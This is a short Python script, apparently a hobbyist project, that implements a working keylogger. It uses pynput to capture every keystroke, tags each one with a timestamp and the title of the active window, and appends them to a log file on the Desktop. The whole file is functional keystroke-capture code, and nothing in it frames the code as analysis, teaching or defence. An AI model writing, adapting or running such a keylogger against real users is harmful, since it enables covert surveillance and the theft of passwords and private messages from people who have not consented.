import time
import os
from pynput import keyboard
import pygetwindow as gw # type: ignore

# log file path..
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")
#it worksssss!!!!!!
# active window.. 
def get_active_window():
    try:
        window = gw.getActiveWindow()
        return window.title if window else "Unknown Window"
    except:
        return "Unknown Window"

# keylogging..
def key_pressed(key):
    try:
        with open(desktop_path, "a") as log:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            window = get_active_window()  # Get active window title

            if hasattr(key, 'char') and key.char is not None:
                log.write(f"{timestamp} | {window} | {key.char}\n")
            else:
                log.write(f"{timestamp} | {window} | [{key}]\n")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print(f"[+] Keylogger Running... Logs will be saved at: {desktop_path}")
    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()  # loop, stop via killing terminal (CTRL + C)
